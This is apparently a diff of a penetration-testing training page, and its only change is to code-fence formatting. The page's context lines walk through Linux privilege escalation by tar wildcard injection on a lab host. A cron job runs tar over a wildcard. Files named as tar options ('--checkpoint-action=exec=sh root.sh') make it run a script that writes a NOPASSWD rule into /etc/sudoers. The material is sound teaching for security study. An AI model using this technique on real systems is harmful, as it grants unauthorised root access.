@@ -14,8 +14,7 @@ A wildcard character can be used as a replacement for other characters and are i
 
 An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:
 
-```
-        shellsession
+```shellsession
 htb_student@NIX02:~$ man tar
 
 <SNIP>
@@ -31,8 +30,7 @@ The `--checkpoint-action` option permits an `EXEC` action to be executed when a 
 
 Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.
 
-```
-        shellsession
+```shellsession
 #
 #
 mh dom mon dow command
@@ -41,8 +39,7 @@ mh dom mon dow command
 
 We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.
 
-```
-        shellsession
+```shellsession
 htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
 htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
 htb-student@NIX02:~$ echo "" > --checkpoint=1
@@ -50,8 +47,7 @@ htb-student@NIX02:~$ echo "" > --checkpoint=1
 
 We can check and see that the necessary files were created.
 
-```
-        shellsession
+```shellsession
 htb-student@NIX02:~$ ls -la
 
 total 56
@@ -67,8 +63,7 @@ drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
 
 Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.
 
-```
-        shellsession
+```shellsession
 htb-student@NIX02:~$ sudo -l
 
 Matching Defaults entries for htb-student on NIX02:
